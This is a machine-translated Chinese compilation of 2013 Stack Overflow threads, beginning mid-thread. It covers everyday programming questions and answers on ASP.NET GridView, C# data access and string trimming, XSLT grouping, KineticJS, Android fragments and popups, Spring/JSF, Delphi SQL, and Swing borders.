在之前的评论中已经给出了答案。把它拼出来...

```
protected void Page_Load(object sender, EventArgs e)
{
    if (!Page.IsPostBack)
    {
        txtSODate.Text = DateTime.Now.Date.ToString("dd/MM/yyyy");
        //--
        dtProductDet = new DataTable("dtProductDet");
        dtProductDet.Columns.Add("PID", typeof(int));
        dtProductDet.Columns.Add("PName", typeof(string));
        dtProductDet.Columns.Add("Quan", typeof(decimal));
        dtProductDet.Rows.Add(0,"",0);
        //--
        GridView1.DataSource = dtProductDet;
        GridView1.DataBind();
    }
}

protected void GridView1_RowCommand(object sender, GridViewCommandEventArgs e)
{
    switch (e.CommandName.ToUpper())
    {
        case "ADD":
            dtProductDet.Rows.Add(0, "", 0);
            break;
        case "DELETE":
            dtProductDet.Rows.RemoveAt(Convert.ToInt32(e.CommandArgument));
            break;
    }
    GridView1.DataBind();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T13:20:17.253

我有解决办法。

问题是，当我在 DropDownList 或 TextBox 中编辑值时，它的值不会保存回与 GridView 和 TextBox 和 DropDownList 绑定的 DataTable。没有自动的方法来做到这一点，所以我们必须编写手动代码来将值保存回 DataTable。

当我问问题添加按钮在 GridViewColumn 中并且它是命令列时，现在我在 GridView 页脚中添加了一个按钮。

因此，当我单击“添加新行”按钮时，页面被回发，在第一页加载事件触发，然后 Button_Click 事件触发。我在 Page.Load 事件上添加了代码，如果页面被回发，则从 GridView 中选择数据并将其保存到 DataTable。

接下来 Button_click 事件触发，因此在 DataTable 中添加了一个新行，DataTable 将在 GridView 的 DataSource 中分配，并且 DataBind 方法执行并重新生成 GridView。

我有一个 DropDownList，它也绑定到除 GridView 之外的不同 DataTable，因此在 DataBind() 之后，我必须根据保存在 GridView 的 DataTable 中手动选择 DropDownList 中的值。

```
protected void Page_Load(object sender, EventArgs e)
{
    if (!Page.IsPostBack)
    {
        txtSODate.Text = DateTime.Now.Date.ToString("dd/MM/yyyy");
        //--
        dtProductDet = new DataTable("dtProductDet");
        dtProductDet.Columns.Add("PID", typeof(int));
        dtProductDet.Columns.Add("PName", typeof(string));
        dtProductDet.Columns.Add("Quan", typeof(decimal));
        dtProductDet.Rows.Add(0,"",0);
        //--
        SetGridViewSource();
    }
    else
    {
        DataTable dtPD = dtProductDet;
        DropDownList ddlProd = null;
        if (GridView1.Rows.Count > 0)
        {
            for (int i = 0; i < GridView1.Rows.Count; i++)
            {
                ddlProd = (DropDownList)GridView1.Rows[i].Cells[gvci_Prod].FindControl("ddlProduct");
                dtPD.Rows[i]["PID"] = Convert.ToInt32(ddlProd.SelectedItem.Value);
                dtPD.Rows[i]["PName"] = ddlProd.SelectedItem.Text;
                dtPD.Rows[i]["QUAN"] = ((TextBox)GridView1.Rows[i].Cells[gvci_Quan].FindControl("txtQuan")).Text;
            }
        }
        dtProductDet = dtPD;
    }
}

protected void btnAdd_Click(object sender, EventArgs e)
{
    dtProductDet.Rows.Add(0, "", 0);

    DataTable dtPDet = dtProductDet;
    GridView1.DataSource = dtPDet;
    GridView1.DataBind();

    DropDownList ddlProd = null;
    DataRow drFind = null;
    for (int i = 0; i < GridView1.Rows.Count; i++)
    {
        ddlProd = (DropDownList)GridView1.Rows[i].Cells[gvci_Prod].FindControl("ddlProduct");
        drFind = dtProductMaster.Rows.Find(dtPDet.Rows[i]["PID"]);
        if(drFind != null)
        {
            ddlProd.SelectedIndex = dtProductMaster.Rows.IndexOf(drFind);
        }
    }

} 
```

# gwt - GWT Graphics 是否支持移动设备？

> ID：15879173
> 
> 赞同：0
> 
> 时间：2013-04-08T12:35:59.813
> 
> 标签：gwt, svg, vector-graphics, vml

我正在寻找 GWT 的跨浏览器矢量图形库，我遇到了[GWT Graphics](https://code.google.com/p/gwt-graphics/)。

该库已经过测试，可与以下浏览器一起使用：

*   Internet Explorer 6 和更新版本（6,7 和 8 使用 VML 渲染，9 使用 SVG）
*   Firefox 3.0 及更新版本
*   Safari 3.2 及更新版本
*   Opera 9.6 及更新版本
*   谷歌浏览器

它也适用于任何移动设备吗？

你知道在 GWT 中绘制矢量图形的任何替代方法吗？

# iphone - 如何从 Twitter 获取访问令牌？

> ID：15879175
> 
> 赞同：1
> 
> 时间：2013-04-08T12:36:08.020
> 
> 标签：iphone, twitter, login

我已经在我的 iphone 应用程序中创建了 Titter 登录，在这里我想将我的访问令牌和密钥发送到服务器以实现自动共享功能，我无法获得我的访问令牌和密钥，请提前帮助我。

这是我的代码：

```
ACAccountType *twitterType = [store accountTypeWithAccountTypeIdentifier:ACAccountTypeIdentifierTwitter];
[store requestAccessToAccountsWithType:twitterType
                 withCompletionHandler:^(BOOL granted, NSError *error){

                     if(!granted){
                         NSLog(@"%@",[error localizedDescription]);
                     }
                     NSLog(@"store %@",store);
                 }];
if([[store accounts] count] > 0)
{
    NSLog(@"TWEET");
    self.hasTwitterAccountAccess = YES;
}
else
{
    NSLog(@"newlog");
    self.hasTwitterAccountAccess = NO;
}

if(self.hasTwitterAccountAccess){
    NSLog(@"login");
    // If we have twitter access, refresh the table view
    ACAccountType *twitterType = [store accountTypeWithAccountTypeIdentifier:ACAccountTypeIdentifierTwitter];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T18:29:46.033

您必须使用反向 OAuth：[https ://dev.twitter.com/docs/ios/using-reverse-auth](https://dev.twitter.com/docs/ios/using-reverse-auth)

# java - 托管bean和spring控制器有什么区别？

> ID：15879178
> 
> 赞同：6
> 
> 时间：2013-04-08T12:36:19.457
> 
> 标签：java, spring, jsf, controller, javabeans

我正在开发 spring-hibernate-jsf 应用程序，但我不明白 managedbean 和 spring 控制器之间的区别。我认为 managedbeans 像控制器一样工作。使用控制器或 managedbean 有什么好处吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:16:05.290

托管 Bean 提供服务并用作 UI 组件的模型。控制器是请求/响应组件，例如 Servlet。

JSF 是一个基于组件的 Web 框架，而 Spring 是一个 DI 框架。JSF 和 Spring 管理它们自己的 bean，因此要引用 ManagedBeans 并注入它们，您需要使用 @Controller 注解将 JSF ManagedBeans 标记为 Spring Controllers。

如果您正在考虑用另一个替换一个，那么如果您想同时使用 Spring 和 JSF，那么您必须同时使用它们。

# delphi - 将sql从服务器语法转换为绝对数据库

> ID：15879183
> 
> 赞同：-1
> 
> 时间：2013-04-08T12:36:31.200
> 
> 标签：delphi, delphi-xe2, delphi-xe, unidac

这是使用 Unidac 组件与 SQL Server 一起使用的原始代码：在我拥有的 uniQuery 的 SQL (TStrings) 中：

```
 use HIS
    DECLARE @StartDate  DATETIME,
            @EndDate    DATETIME,
            @RoomType   VARCHAR(6)
    ;

     SELECT @StartDate  = '2011-04-15',
            @EndDate    = '2011-04-26',
            @RoomType   = 'DBLMS'
    ;
    WITH 
    cteStayDates AS
    ( 
     SELECT RoomType  = Room_Type,
            StartDate = CASE WHEN Rate_Start_Date < @StartDate THEN @StartDate ELSE Rate_Start_Date END,
            EndDate   = CASE WHEN Rate_End_Date   > @EndDate   THEN @EndDate   ELSE Rate_End_Date   END,
            Rate
       FROM dbo.Room_Rates
      WHERE @RoomType  = Room_Type
        AND @StartDate < Rate_End_Date
        AND @EndDate  >= Rate_Start_Date
    ) 
     SELECT RoomType, StartDate, EndDate, Rate, 
            Days = DATEDIFF(dd,StartDate,EndDate)
                 + CASE WHEN EndDate = @EndDate THEN 0 ELSE 0 END
       FROM cteStayDates
      ORDER BY StartDate
    ; 
```

在按钮点击我有：

```
procedure TForm1.Button1Click(Sender: TObject);
//uniQuery1.SQL.Add('SET DATEFORMAT DMY');
begin
uniQuery1.Close;
uniQuery1.SQL.Clear;
uniQuery1.SQL.Add('DECLARE @StartDate  DATETIME,');
uniQuery1.SQL.Add('@EndDate    DATETIME,');
uniQuery1.SQL.Add('@RoomType   VARCHAR(6);');
uniQuery1.SQL.Add('SELECT @StartDate  = :a2,');
uniQuery1.SQL.Add('@EndDate    = :a3,');
uniQuery1.SQL.Add('@RoomType   = :a1;');
uniQuery1.SQL.Add('WITH');
uniQuery1.SQL.Add('cteStayDates AS');
uniQuery1.SQL.Add('( SELECT RoomType  = Room_Type,');
uniQuery1.SQL.Add('StartDate = CASE WHEN Rate_Start_Date < @StartDate THEN @StartDate ELSE Rate_Start_Date END,');
uniQuery1.SQL.Add('EndDate   = CASE WHEN Rate_End_Date   > @EndDate   THEN @EndDate   ELSE Rate_End_Date   END,');
uniQuery1.SQL.Add('Rate');
uniQuery1.SQL.Add('FROM dbo.Room_Rates');
uniQuery1.SQL.Add('WHERE @RoomType  = Room_Type');
uniQuery1.SQL.Add('AND @StartDate < Rate_End_Date');
uniQuery1.SQL.Add('AND @EndDate  >= Rate_Start_Date)');
uniQuery1.SQL.Add('SELECT RoomType, StartDate, EndDate, Rate,');
uniQuery1.SQL.Add('Days = DATEDIFF(dd,StartDate,EndDate)');
//uniQuery1.SQL.Add('+ CASE WHEN EndDate = @EndDate THEN 0 ELSE 0 END');
uniQuery1.SQL.Add('FROM cteStayDates  ORDER BY StartDate;');
uniQuery1.Params.ParamByName('a1').AsString := cxTextEdit1.Text;
uniQuery1.Params.ParamByName('a3').AsDate := cxDateEdit2.Date; // end date
uniQuery1.Params.ParamByName('a2').AsDate := cxDateEdit1.Date; // start date
uniQuery1.Open;

end; 
```

现在我正在尝试将此代码移植到绝对数据库（表字段相同）但无法使其正常工作。有人可以帮我弄这个吗 ？

我还尝试将此查询放在 ABSQuery1 的 SQL 文本中：

```
SELECT RoomType, StartDate, EndDate, Rate, 
            Days = DATEDIFF(dd,StartDate,EndDate)
                 + CASE WHEN EndDate = EndDate THEN 0 ELSE 0 END
  RoomType  = Room_Type,
            StartDate = CASE WHEN Rate_Start_Date < StartDate THEN StartDate ELSE Rate_Start_Date END,
            EndDate   = CASE WHEN Rate_End_Date   > EndDate   THEN EndDate   ELSE Rate_End_Date   END,
            Rate
       FROM Room_Rates
      WHERE RoomType  = Room_Type
        AND StartDate < Rate_End_Date
        AND EndDate  >= Rate_Start_Date      ORDER BY StartDate
    ; 
```

但我无法检索字段，所以它无法正常工作。真的不知道为什么。连接设置正确。当我尝试检索我得到的字段时： ![在此处输入图像描述](https://i.stack.imgur.com/a7hHn.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:45:48.503

公用表表达式 ( `with cteStayDates as (..)`) 是一种可能不是绝对的 SQL Server 功能。您可以尝试以下方法：

```
 use HIS
    DECLARE @StartDate  DATETIME,
            @EndDate    DATETIME,
            @RoomType   VARCHAR(6)
    ;

     SELECT @StartDate  = '2011-04-15',
            @EndDate    = '2011-04-26',
            @RoomType   = 'DBLMS'
    ;
     SELECT RoomType, StartDate, EndDate, Rate, 
            Days = DATEDIFF(dd,StartDate,EndDate)
                 + CASE WHEN EndDate = @EndDate THEN 0 ELSE 0 END
  RoomType  = Room_Type,
            StartDate = CASE WHEN Rate_Start_Date < @StartDate THEN @StartDate ELSE Rate_Start_Date END,
            EndDate   = CASE WHEN Rate_End_Date   > @EndDate   THEN @EndDate   ELSE Rate_End_Date   END,
            Rate
       FROM dbo.Room_Rates
      WHERE @RoomType  = Room_Type
        AND @StartDate < Rate_End_Date
        AND @EndDate  >= Rate_Start_Date      ORDER BY StartDate
    ; 
```

# c# - 使用 C# 将数据从数据库检索到变量中

> ID：15879186
> 
> 赞同：0
> 
> 时间：2013-04-08T12:36:37.800
> 
> 标签：c#, sql-server-2008

您好我正在尝试将数据库中的数据存储到变量中，然后尝试处理它。但不知何故，该变量不会从数据库中读取任何数据并给出其初始值。这是代码

```
int c1=0,c2=0.c3=0,c4=0,sum;

if (rbFour.Checked == true)
        {
            proce = cmb1.Text + "," + cmb2.Text + "," + cmb3.Text + "," + cmb4.Text;
            SqlDataAdapter d = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb1.ValueMember, Program.con);
            DataTable t = new DataTable();
            foreach (DataRow row in t.Rows)
            {

            c1 = Convert.ToInt32(row[0]);
        }
        SqlDataAdapter qd = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb2.ValueMember, Program.con);
        DataTable qt = new DataTable();
        foreach (DataRow row in qt.Rows)
        {

            c2 = Convert.ToInt32(row[0]);
        }
        SqlDataAdapter wd = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb3.ValueMember, Program.con);
        DataTable wt = new DataTable();
        foreach (DataRow row in wt.Rows)
        {

            c3 = Convert.ToInt32(row[0]);
        }
        SqlDataAdapter ed = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb4.ValueMember, Program.con);
        DataTable et = new DataTable();
        foreach (DataRow row in et.Rows)
        {

            c4 = Convert.ToInt32(row[0]);
        }
    }
    else if (rbThree.Checked == true)
    {
        proce = cmb1.Text + "," + cmb2.Text + "," + cmb3.Text;
        SqlDataAdapter d = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb1.ValueMember, Program.con);
        DataTable t = new DataTable();
        foreach (DataRow row in t.Rows)
        {

            c1 = Convert.ToInt32(row[0]);
        }
        SqlDataAdapter qd = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb2.ValueMember, Program.con);
        DataTable qt = new DataTable();
        foreach (DataRow row in qt.Rows)
        {

            c2 = Convert.ToInt32(row[0]);
        }
        SqlDataAdapter wd = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb3.ValueMember, Program.con);
        DataTable wt = new DataTable();
        foreach (DataRow row in wt.Rows)
        {

            c3 = Convert.ToInt32(row[0]);
        }
    }
    else if (rbTwo.Checked == true)
    {
        proce = cmb1.Text + "," + cmb2.Text;
        SqlDataAdapter d = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb1.ValueMember, Program.con);
        DataTable t = new DataTable();

        foreach (DataRow row in t.Rows)
        {

            c1 = Convert.ToInt32(row[0]);
        }
        SqlDataAdapter qd = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb2.ValueMember, Program.con);
        DataTable qt = new DataTable();
        qd.Fill(qt);
        foreach (DataRow row in qt.Rows)
        {

            c2 = Convert.ToInt32(row[0]);
        }

    }
    else
    {
        proce = cmb1.Text;
        SqlDataAdapter d = new SqlDataAdapter("Select Amount from addpro where SSN=" + cmb1.ValueMember, Program.con);
        DataTable t = new DataTable();
        foreach (DataRow row in t.Rows)
        {

            c1 = Convert.ToInt32(row[0]);
        }
    } 
```

任何人都可以帮助解决这个问题。我几天前使用了相同的代码。它工作正常。但现在我不知道它有什么问题。我需要尽快解决，有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:40:17.267

您需要在使用前[填写数据表](http://msdn.microsoft.com/en-us/library/905keexk.aspx)

```
 SqlDataAdapter d = new SqlDataAdapter("...", con);
  DataTable t = new DataTable();
  d.Fill(t);  // Here 
```

其余的适配器依此类推。

但是，让我展示一种不同的方法：

```
string sqlText = "Select Amount from addpro where SSN=@ssn";
SqlCommand cmd = new SqlCommand(sqlText, Program.con);
cmd.Parameters.AddWithValue("@ssn", cmb1.ValueMember);
object result = cmd.ExecuteScalar();
if(result != null)
    c1 = Convert.ToInt32(result); 
```

您将返回具有单个值的单行（如果找到）。这是SqlCommand的[ExecuteScalar](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.executescalar.aspx)方法提供的使用场景。无需创建 SqlAdapter、DataTable 并用单个行/值填充它。

此外，我已删除您的字符串连接并使用参数化查询来避免 Sql 注入攻击。尽管在您的代码中有点不可能，但在任何地方使用都是一个好习惯。

有了上面的代码，很容易构建一个接收组合框控件的通用方法，应用所需的逻辑并返回整数值

```
 private int GetComboValue(ComboBox cbo)
 {
      // all the code above replacing cmb1 with cbo and c1 with ssnNumber
      .....
      return ssnNumber;
 } 
```

现在你可以使用

```
if (rbFour.Checked == true)
{
   c1 = GetComboValue(cmb1);
   c2 = GetComboValue(cmb2);
   c3 = GetComboValue(cmb3);
   c4 = GetComboValue(cmb4);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:41:34.803

使用 fill() 方法先用 dataadapter 填充数据表，然后尝试访问数据行

例如：d.fill（dt）；

# xslt - XSLT 使用 Muenchian 分组方法过滤组内的唯一节点

> ID：15879188
> 
> 赞同：0
> 
> 时间：2013-04-08T12:36:49.460
> 
> 标签：xslt, filter, unique, grouping

我正在关注这篇关于[Muenchian 分组方法](http://www.jenitennison.com/xslt/grouping/muenchian.html)的文章作为参考。

在我的问题中，在每个组中，节点的某些值`<forename>`可以重复，而我想过滤唯一值。我尝试应用`forename[not(.=preceding-sibling::forename)]` 选择标准，但这不起作用，因为我在输出中看到重复项。

下面是我正在测试的 XSLT（这与上面的文章中应用额外过滤器的“隔离”行基本完全相同）。

我显然弄错了。这里有什么问题？

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

    <xsl:output indent="yes" method="text"/>
    <xsl:key name="contacts-by-surname" match="contact" use="surname" />
    <xsl:template match="records">
        <xsl:for-each select="contact[count(. | key('contacts-by-surname', surname)[1]) = 1]">
            <xsl:sort select="surname" />
            <xsl:value-of select="surname" />
            <xsl:for-each select="key('contacts-by-surname', surname)">
                <xsl:sort select="forename" />

                <xsl:value-of select="forename[not(.=preceding-sibling::forename)]" />

            </xsl:for-each>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:50:07.300

您可以使用另一个键进行两级分组

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

    <xsl:output indent="yes" method="text"/>
    <xsl:key name="contacts-by-surname" match="contact" use="surname" />
    <xsl:key name="contacts-by-full-name" match="contact" use="concat(surname, '|', forename)" />
    <xsl:template match="records">
        <xsl:for-each select="contact[count(. | key('contacts-by-surname', surname)[1]) = 1]">
            <xsl:sort select="surname" />
            <xsl:value-of select="surname" />
            <xsl:for-each select="key('contacts-by-surname', surname)
                [count(. | key('contacts-by-full-name',
                               concat(surname, '|', forename'))[1]) = 1]">
                <xsl:sort select="forename" />
                <xsl:value-of select="forename" />
            </xsl:for-each>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet> 
```

在这里，在每个`surname`组中，我正在对全名 (surname|forename) 进行另一个 Muenchian 分组，并仅提取具有该姓氏的联系人集中每个名字的第一个实例。

# javascript - 将动力学精灵移动到特定点

> ID：15879189
> 
> 赞同：0
> 
> 时间：2013-04-08T12:36:49.377
> 
> 标签：javascript, html, kineticjs

```
<script>
        var stage = new Kinetic.Stage({
            container: 'container',
            width: 800,
            height: 600
        });

        var layer = new Kinetic.Layer();

        var image = new Image();
        var image2 = new Image();
        var newX = 500;
        var animations = {
        pos1: [{
            x: 32,
            y: 32,
            width: 32,
            height: 32
            },
            {
            x: 64,
            y: 32,
            width: 32,
            height: 32
            },
            {
            x: 96,
            y: 32,
            width: 32,
            height: 32
            },{
            x: 128,
            y: 32,
            width: 32,
            height: 32
            },
            {
            x: 160,
            y: 32,
            width: 32,
            height: 32
            },
            {
            x: 32,
            y: 0,
            width: 32,
            height: 32
            },],

        };

        image.onload = function() {

            var anim = new Kinetic.Sprite({
                x: 100,
                y: 100,
                image: image,
                animation: 'pos1',
                animations: animations,
                frameRate: 10
                });
            layer.add(anim);

            stage.add(layer);
            anim.start();

        };

    //image.src = 'myimgsrc';
</script> 
```

这将启动一个 Sprite 动画。它是一个能够做步行动画的角色，现在我想用一个按钮或其他东西让他从一个点到另一个点。我现在的问题是，我怎样才能用 x = 100 的动画慢慢移动这个精灵到 x = 700 并停止动画？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-08T06:02:00.000

您可以使用 transitionTo 进行移动：

```
anim.transitionTo({
  x : 200,
  duration: 3
 }); 
```

如果您需要在移动后停止精灵动画：

```
setTimeout(function(){
  anim.stop();
},3000); 
```

示例：http: [//jsfiddle.net/lavrton/7C6Mn/](http://jsfiddle.net/lavrton/7C6Mn/)

# api - 任何可用于控制流量管理器的 Akamai API？

> ID：15879190
> 
> 赞同：1
> 
> 时间：2013-04-08T12:36:50.670
> 
> 标签：api, akamai

我们需要经常从 Akamai 的全球流量管理器中删除数据中心。

是否有任何 API 可以通过代码而不是每次都登录到 Akamai 站点来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-01-30T19:54:32.720

是的，有一堆 API 可以在 Akamai 中管理您的 GTM 配置文件：

[https://developer.akamai.com/api/luna/config-gtm/overview.html](https://developer.akamai.com/api/luna/config-gtm/overview.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T20:00:51.800

只需删除活性测试对象

# java - 在 Eclipse 中将 Maven 项目作为应用程序运行

> ID：15879192
> 
> 赞同：0
> 
> 时间：2013-04-08T12:36:52.947
> 
> 标签：java, eclipse, maven

`Import , Maven , Existing Maven Projects`我已经使用菜单选项将整个项目导入 Eclipse 。

为了运行它，我提供了一些选项： 运行为：

*   Java 应用程序
*   Java 服务器
*   小程序
*   Maven 清洁
*   Maven 安装
*   等等

我是否应该将它作为 Java 应用程序运行，就像我在 Eclipse 中对 Java 程序所做的那样？（Mac 10.7.5 上的 Eclipse Juno）

谢谢你。

# android - Android getActivity() 总是在片段内返回 null

> ID：15879203
> 
> 赞同：8
> 
> 时间：2013-04-08T12:37:17.930
> 
> 标签：android, android-fragments, fragment, android-fragmentactivity

我遇到了一个奇怪的问题：getActivity() 方法**总是**在片段内返回 null。我在 onAttach() 和 onCreateView() 完成运行后调用它。

该片段位于包含片段堆栈的 FragmentActivity() 中，我向其中添加片段的方式是：

（这段代码是从 Fragment Activity() 的 onCreate() 调用的）

```
SmartFragment fragment;
fragment = (SmartFragment) Fragment.instantiate(this,
fragmentClassName, params);     
mStackOfFragments.add(fragment);
FragmentTransaction trans = getSupportFragmentManager().beginTransaction();
trans.add(R.id.tabcontent, fragment);
trans.addToBackStack(null);
trans.commitAllowingStateLoss(); 
```

我希望它足够清楚

编辑1：

对 getActivity() 的调用：

```
protected OnDoneListener nDoneListener = new OnDoneListener() {

    @Override
    public void OnDone(final int counter, final String name) {

        if (getActivity() != null)
            ((TabActivity) getActivity()).RunOnUiThread(new Runnable() { 
```

……

正在从不同的类调用此回调。

编辑2：

```
class MemoryManager()
{

    private OnDoneListener nDoneListener;

    public void setOnDoneListener(OnDoneListener onDoneListener)
    {
    this.onDoneListner = onDoneListener;
    }

    public void updateUiOnRequestFinish()
    {
      onDoneListener.onDone();
    }

} 
```

MemoryManaget 本身从不同的回调调用 updateUiOnRequestFinish()

编辑3：

FragmentManager 日志是：

```
04-08 18:44:05.950: V/FragmentManager(16280): Commit: BackStackEntry{41f9bd60}
`04-08 18:44:05.950: D/FragmentManager(16280):   mName=null mIndex=-1 mCommitted=false
04-08 18:44:05.950: D/FragmentManager(16280):   Operations:
04-08 18:44:05.950: D/FragmentManager(16280):     Op #0: ADD FragmentMyProfile{41f9bc20 id=0x7f070126}
04-08 18:44:05.950: V/FragmentManager(16280): Setting back stack index 0 to BackStackEntry{41f9bd60}
04-08 18:44:05.950: V/FragmentManager(16280): Run: BackStackEntry{41f9bd60 #0}
04-08 18:44:05.950: V/FragmentManager(16280): Bump nesting in BackStackEntry{41f9bd60 #0} by 1
04-08 18:44:05.950: V/FragmentManager(16280): Bump nesting of FragmentMyProfile{41f9bc20 id=0x7f070126} to 1
04-08 18:44:05.950: V/FragmentManager(16280): add: FragmentMyProfile{41f9bc20 id=0x7f070126}
04-08 18:44:05.950: V/FragmentManager(16280): Allocated fragment index FragmentMyProfile{41f9bc20 #0 id=0x7f070126}
04-08 18:44:05.950: V/FragmentManager(16280): moveto CREATED: FragmentMyProfile{41f9bc20 #0 id=0x7f070126}
04-08 18:44:05.950: V/FragmentManager(16280): moveto ACTIVITY_CREATED: FragmentMyProfile{41f9bc20 #0 id=0x7f070126}
04-08 18:44:05.990: V/FragmentManager(16280): moveto STARTED: FragmentMyProfile{41f9bc20 #0 id=0x7f070126}
04-08 18:44:06.030: V/FragmentManager(16280): moveto RESUMED: FragmentMyProfile{41f9bc20 #0 id=0x7f070126}
` 
```

对我来说它看起来不错。所以我猜测这个错误与我从回调中调用 getActivity() 的方式有关。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-09T17:14:24.857

这个问题可能是因为使用了“android.app.Fragment”或“android.support.v4.app.Fragment”的getActivity()

如果您使用的是“android.support.v4.app.Fragment”，则需要检查您是否使用“android.app.Fragment”中的 getActivity，反之亦然。

# c# - 如果出现在末尾，则从字符串中删除“，”

> ID：15879210
> 
> 赞同：5
> 
> 时间：2013-04-08T12:37:37.577
> 
> 标签：c#, asp.net

`,`从以下字符串中删除的最佳方法是什么。

1.  一二三，
2.  三、四、五
3.  六、七、八、九、十、

    > ```
    > int strLength = someString.Length;
    > 
    > if (strLength > 0)
    > {
    >      findString = findString .Substring(0, str.Length - 1);
    > }
    > 
    > if (findString ==",")
    > {
    >      someString.Remove(someString.Length - 1)
    > } 
    > ```

作为示例，我直接在 StackExchange 编辑器中快速编译了此代码（可能有语法错误。

请仅将以上内容作为逻辑目的。

如果有人可以为上述逻辑提供优化的代码，我将不胜感激。

**更新**`,`：如果出现在字符串末尾而不是中间，我实际上想从字符串中删除 。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-08T12:44:44.827

这个怎么样。

```
yourString = yourString.TrimEnd(','); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-08T12:46:17.793

单行选项：

```
someString = someString.EndsWith(",") ? someString.Substring(0, someString.Length - 1) : someString; 
```

编辑：

根据[Dilshod](https://stackoverflow.com/users/2182401/dilshod)的[回答](https://stackoverflow.com/questions/15879210/remove-from-string-if-present/15879377#15879377)，这可以表示为

```
someString = someString.TrimEnd(','); 
```

恕我直言，哪个更好。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-08T12:39:51.040

您可以使用替换功能

```
 yourString.Replace(',',''); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-08T12:39:18.797

这个怎么样

```
if(someString.Last() == ',')
{
    someString = someString.Substring(0, someString.Length - 1);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-08T12:39:01.600

这取决于您到底要做什么...用“”替换“，”可能就是您所需要的吗？您期望的输出值是多少？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-08T12:42:11.663

检查下面的代码：

```
 string s = "one,two,three,";   
 s = s.Remove(s.LastIndexOf(",")); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-08T12:43:41.793

```
someString = someString.Remove(someString.Length - 1); 
```

这将删除字符串的最后一个字符。请务必在执行此操作之前检查字符串的长度。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-04-08T12:46:11.277

请试试：

```
 string s = "x,y,";
 if (s.Length > 0 && s.EndsWith(","))
   s = s.TrimEnd(','); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-04-08T12:49:38.183

使用 LastIndexOf()

```
string str="One,Two,Three,";
string newString=str.Remove(str.LastIndexOf(',')) //Result= "One,Two,Three"; 
```

# android - 在弹出窗口android中显示活动

> ID：15879213
> 
> 赞同：3
> 
> 时间：2013-04-08T12:37:42.023
> 
> 标签：android, android-activity, popupwindow

我的任务是制作一个看起来像 facebook 通知屏幕的活动，请参阅附件图片

![在此处输入图像描述](https://i.stack.imgur.com/sH4TB.jpg)

任何人都可以帮助我提供教程或示例来帮助我使活动看起来像这样吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T13:10:17.043

//试试这个我想它可能对你有帮助

```
LayoutInflater inflater = (LayoutInflater) youractivityname.this
                        .getSystemService(LAYOUT_INFLATER_SERVICE);

                View pview;
                pview = inflater.inflate(R.layout.Yourlayoutname, null);

                PopupWindow cp = new PopupWindow(pview, LayoutParams.WRAP_CONTENT,
                        LayoutParams.WRAP_CONTENT, true);
                cp.setBackgroundDrawable(new BitmapDrawable());
                cp.showAtLocation(v, Gravity.CENTER, 0, 0);
                cp.update(0, 0, 500, 350); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-28T05:45:57.457

为了达到这个效果，我使用了一个带有对话框主题的普通活动并将其背景设置为透明，并覆盖 onAttachActivity 事件以根据需要设置新活动的位置、宽度和高度

# java - 在java中动态改变TitledBorder颜色

> ID：15879216
> 
> 赞同：2
> 
> 时间：2013-04-08T12:37:48.790
> 
> 标签：java, swing, jpanel, border, titled-border

我创建了一个 TitledBorder 并将其设置为 JPanel。

```
JPanel panel = new JPanel();
panel.setBorder(javax.swing.BorderFactory.
      createTitledBorder(null, "title", javax.swing.border.
      TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.
      TitledBorder.DEFAULT_POSITION, null, java.awt.Color.red)); 
```

现在我想改变边框标题文本的颜色；如果可能的话，边界线。我看到当我通过方法`titledborder.setTitleColor(theColor);`和`revalidate()`和更改边框颜色时`repaint()`；表单上的面板不受影响。我还创建了新实例`thiledBorder`并将其分配给面板；但没有效果。是否需要更新面板，然后将其设置为新的边框实例？谢谢你

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-08T12:49:44.930

您没有说明如何`titledborder`分配，但这就是它的工作方式：

```
TitledBorder titledBorder = BorderFactory.createTitledBorder(...);
panel.setBorder(titledBorder); 
```

然后在运行时：

```
titledBorder.setTitleColor(theColor);
repaint(); // revalidate not necessry 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-02-19T10:24:51.653

如果你知道你的面板有一个标题边框，你可以这样做：

```
 TitledBorder titledBorder = (TitledBorder)jPanel1.getBorder();
    titledBorder.setTitleColor(Color.red); 
```

